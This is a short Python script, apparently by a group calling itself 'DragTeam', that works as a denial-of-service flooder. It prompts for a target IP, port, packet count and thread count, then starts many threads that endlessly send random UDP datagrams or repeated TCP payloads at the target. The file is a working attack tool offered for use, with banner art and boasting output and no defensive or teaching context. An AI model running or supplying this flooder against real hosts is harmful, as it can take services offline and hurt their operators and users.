import random
import socket
import threading
import platform

print("DoS Ligado : "+platform.system())

if platform.system() == 'Windows':

	print("""
 DragTeam presentes :


██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║░╚═══██╗
██████╔╝╚█████╔╝██████╔╝
╚═════╝░░╚════╝░╚═════╝░

Criado by SasukeTR3M

	""")
else :
	print("""
 DragTeam presentes :



┏━━━┓╋╋┏━━━┓
┗┓┏┓┃╋╋┃┏━┓┃
╋┃┃┃┣━━┫┗━━┓
╋┃┃┃┃┏┓┣━━┓┃
┏┛┗┛┃┗┛┃┗━┛┃
┗━━━┻━━┻━━━┛
IP Default: DoS | Port default: 80 | Packets default: 8080 | Threads: 100.
		""")


print("DoS Ativado - #DragTeam")
ip= str(input(" IP :"))
port= int(input("  Port :"))
choice = str(input(" DoS Atack (y/n) :"))
times= int(input(" Packets  :"))
threads= int(input(" Threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"DRAGTEAM DOMINA!!!")
		except:
			print("[!] NET DROPADA")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"DRAGTEAM DOMINA")
		except:
			s.close()
			print("[*] NET DROPADA")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()